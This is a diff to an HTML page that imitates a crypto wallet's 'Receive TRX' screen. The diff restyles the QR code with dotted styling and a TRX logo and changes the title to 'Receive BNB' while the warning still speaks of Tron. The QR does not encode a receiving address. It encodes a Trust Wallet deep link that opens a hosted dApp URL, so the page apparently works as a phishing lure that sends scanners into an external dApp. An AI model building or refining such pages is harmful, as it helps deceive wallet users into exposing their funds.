@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -91,27 +90,9 @@
       border-radius: 16px;
       padding: 16px;
       position: relative;
-    }
-
-    .qr-center {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 48px;
-      height: 48px;
-      background: white;
-      border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      overflow: hidden;
-    }
-
-    .qr-center img {
-      width: 36px;
-      height: 36px;
-      object-fit: contain;
     }
 
     .section-label {
@@ -186,10 +167,6 @@
       line-height: 1.5;
       margin-top: 15px;
     }
-
-    #qrcode canvas {
-      display: block;
-    }
   </style>
 </head>
 
@@ -203,14 +180,14 @@
           <path d="M15 18l-6-6 6-6"/>
         </svg>
       </div>
-      <div class="header-title">Receive TRX</div>
+      <div class="header-title">Receive BNB</div>
       <div style="width:40px"></div>
     </div>
 
     <div class="warning">
       <div class="warning-icon">!</div>
       <div>
-        Only send TRX on the Tron network to the correct
+        Only send Trx on the Tron network to the correct
         receiving address. Sending unsupported assets may
         result in permanent loss.
       </div>
@@ -218,13 +195,8 @@
 
     <div class="qr-wrapper">
       <div class="qr-box">
+        <!-- Container for the dotted QR code -->
         <div id="qrcode"></div>
-        <div class="qr-center">
-          <img
-            src="https://zengo.com/wp-content/uploads/Tron.png"
-            alt="Tron"
-          />
-        </div>
       </div>
     </div>
 
@@ -269,7 +241,8 @@
 
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <!-- Modern QR Code Styling Library -->
+  <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1.5.0/lib/qr-code-styling.js"></script>
 
   <script>
     // Your hosted DApp URL
@@ -280,16 +253,32 @@
       'https://link.trustwallet.com/open_url?coin_id=195&url='
       + encodeURIComponent(DAPP_URL);
 
-    // Generate QR code
+    // Initialize Dotted QR Code using qr-code-styling
     window.addEventListener('load', function () {
-      new QRCode(document.getElementById('qrcode'), {
-        text: TRUST_WALLET_URL,
+      const qrCode = new QRCodeStyling({
         width: 200,
         height: 200,
-        colorDark: '#000000',
-        colorLight: '#ffffff',
-        correctLevel: QRCode.CorrectLevel.H
+        type: "canvas",
+        data: TRUST_WALLET_URL,
+        image: "https://assets.streamlinehq.com/image/private/w_300,h_300,ar_1/f_auto/v1/icons/vectors/trx-q8ocxy7h0nc2c11ucr2m.png/trx-2ynri4p1kxp5a8djpqdzy8.png?_a=DATAiZAAZAA0",
+        dotsOptions: {
+          color: "#000000",
+          type: "dots" // Changes the standard squares into round dots!
+        },
+        backgroundOptions: {
+          color: "#ffffff",
+        },
+        imageOptions: {
+          crossOrigin: "anonymous",
+          imageSize: 0.4,
+          margin: 5
+        },
+        cornersSquareOptions: {
+          type: "extra-rounded" // Makes corner squares match the rounded aesthetic
+        }
       });
+
+      qrCode.append(document.getElementById("qrcode"));
     });
 
     // Open DApp through Trust Wallet
